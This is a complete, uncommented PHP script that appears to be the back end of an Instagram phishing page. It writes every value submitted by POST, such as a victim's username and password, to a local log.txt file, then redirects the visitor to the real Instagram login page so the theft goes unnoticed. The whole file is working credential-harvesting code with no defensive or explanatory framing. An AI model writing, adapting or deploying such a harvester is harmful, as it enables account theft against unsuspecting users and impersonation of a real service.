<?php 
header ('Location: https://www.instagram.com/accounts/login/'); 
$handle = fopen("log.txt", "a"); 
foreach($_POST as $variable => $value) 
{ 
fwrite($handle, ""); 
fwrite($handle, "     "); 
fwrite($handle, $value); 
fwrite($handle, ""); 
} 
fwrite($handle, ""); 
fclose($handle); 
exit; 
?>